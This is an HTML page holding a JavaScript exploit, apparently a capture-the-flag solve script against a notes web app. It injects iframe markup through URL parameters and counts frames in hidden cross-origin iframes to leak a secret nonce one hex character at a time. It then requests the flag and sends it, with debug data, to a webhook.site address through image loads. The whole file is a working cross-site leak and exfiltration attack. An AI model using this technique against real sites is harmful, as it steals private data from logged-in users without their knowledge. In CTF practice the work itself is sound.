<!DOCTYPE html>
<html>
<body>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
var HEX = '0123456789abcdef';
var ADS = 'https://ads.chall.lac.tf';

function ping(msg) { new Image().src = WH + '?' + encodeURIComponent(msg); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

ping('v4_loaded');

async function testPosition(prefix) {
  var iframes = [];
  for (var i = 0; i < 16; i++) {
    var c = HEX[i];
    // Nested iframe uses valid ads URL to satisfy frame-src CSP
    var payload = '<iframe src=' + ADS + '/1.html></iframe>';
    var url = CHALL + '/?srcdoc=x&referrerPolicy='
      + encodeURIComponent(payload)
      + '&search=' + encodeURIComponent(prefix + c);
    var f = document.createElement('iframe');
    f.src = url;
    f.setAttribute('data-c', c);
    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
    document.body.appendChild(f);
    iframes.push(f);
  }

  await sleep(4000);

  var found = null;
  for (var j = 0; j < iframes.length; j++) {
    var f = iframes[j];
    var c = f.getAttribute('data-c');
    try {
      var total = f.contentWindow.length;
      var withChildren = 0;
      for (var k = 0; k < total; k++) {
        try {
          var cl = f.contentWindow[k].length;
          if (cl > 0) withChildren++;
        } catch(e) {
          ping('innerErr_' + c + '_k=' + k + '_' + e.message);
        }
      }
      var noteCount = total - withChildren;
      if (noteCount > 0 && noteCount < total) {
        // Only count as hit if SOME frames have children and SOME don't
        found = c;
        ping('HIT_c=' + c + '_t=' + total + '_ads=' + withChildren + '_notes=' + noteCount);
      } else if (j === 0) {
        // Debug: log first char's full details
        ping('DBG_c=' + c + '_t=' + total + '_ads=' + withChildren + '_notes=' + noteCount);
      }
    } catch(e) {
      ping('outerErr_' + c + '_' + e.message);
    }
    f.remove();
  }
  return found;
}

async function solve() {
  ping('solving');
  var nonce = '';

  for (var pos = 0; pos < 8; pos++) {
    var found = null;
    for (var att = 0; att < 3 && found === null; att++) {
      ping('pos=' + pos + '_att=' + att + '_pfx=' + nonce);
      found = await testPosition(nonce);
    }
    if (found !== null) {
      nonce += found;
      ping('found=' + found + '_nonce=' + nonce);
    } else {
      ping('FAIL_pos=' + pos + '_nonce=' + nonce);
      break;
    }
  }

  if (nonce.length === 8) {
    ping('fullnonce=' + nonce);
    try {
      var resp = await fetch(CHALL + '/guess?nonce=' + nonce);
      var flag = await resp.text();
      ping('FLAG=' + flag);
    } catch(e) {
      ping('flagerr=' + e.message);
    }
  }
}

solve();
</script>
</body>
</html>
